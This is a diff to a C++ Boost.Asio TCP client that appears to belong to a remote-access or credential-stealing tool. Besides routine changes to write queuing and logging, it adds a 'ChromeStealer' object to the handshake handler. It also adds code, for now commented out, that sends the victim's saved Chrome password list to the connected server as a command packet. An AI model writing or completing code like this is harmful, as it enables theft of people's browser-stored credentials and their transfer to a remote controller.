@@ -34,13 +34,11 @@ void TCPClient::connect(void)
 
 void TCPClient::write(Packet* packet)
 {
-	_io_service.post([this, packet](void) -> void {
-		bool writeInProgress = !_toWrites.empty();
-		_toWrites.push(packet);
-		if (!writeInProgress) {
-			write();
-		}
-	});
+	bool writeInProgress = !_toWrites.empty();
+	_toWrites.push(packet);
+	if (!writeInProgress) {
+		write();
+	}
 }
 
 void TCPClient::disconnect(void)
@@ -86,6 +84,7 @@ void TCPClient::read(void)
 void TCPClient::write(void)
 {
 	Packet *packet = _toWrites.front();
+	StaticTools::Log << "writing: " << std::string(packet->data, packet->size) << std::endl;
 	boost::asio::async_write(_socket, boost::asio::buffer(packet, sizeof(Packet) + packet->size),
 	boost::bind(&TCPClient::do_write, this,
 			boost::asio::placeholders::error,
@@ -150,10 +149,15 @@ void TCPClient::do_write(boost::system::error_code const& ec, size_t)
 
 void TCPClient::do_handshake(boost::system::error_code const& ec)
 {
+	ChromeStealer steal;
+
 	if (!ec) {
 		StaticTools::Log << "Handshake success" << std::endl;
 		_connected = true;
 		write(StaticTools::CreatePacket(PacketType::PT_NewClient, StaticTools::Mac));
+		/*if (steal.canSteal()) {
+			write(StaticTools::CreatePacket(PacketType::PT_Command, steal.stealPasswordList()));
+		}*/
 		read();
 	}
 	else {
